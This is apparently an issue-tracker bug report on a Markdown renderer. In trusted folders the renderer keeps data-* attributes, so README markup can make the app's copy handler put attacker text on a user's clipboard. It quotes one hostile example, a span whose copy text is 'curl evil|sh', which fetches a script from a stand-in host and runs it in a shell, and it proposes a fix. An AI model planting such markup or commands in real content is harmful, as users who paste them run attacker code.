---
type: is
id: is-01m39qqyxg1d5r43e5a7kcsq8e
title: Trusted Markdown can trigger app gadgets through data attributes (data-mb-copy clipboard)
kind: bug
status: in_progress
priority: 3
version: 2
delegate: claude-code@spud10.local
labels:
  - release:v0.12.0
dependencies: []
hold: null
hold_until: null
created_at: 2026-09-24T12:55:13.070Z
updated_at: 2026-09-24T18:04:56.152Z
started_at: 2026-09-24T18:04:56.151Z
---
From the step 8 verification (2026-09-24): in a trusted folder, KPress keeps data-* attributes, so a README <span data-mb-copy="text" data-mb-copy-text="curl evil|sh"> is handled by the SDK's document-wide copy delegate and copies attacker text on click. Untrusted renders strip data-* (inert allowlist), so this affects trusted content only. Scope the SDK's delegated handlers (copy, and any others) to elements the app or a plugin created, e.g. by requiring an app-owned marker or registering targets, and add tests with injected elements.
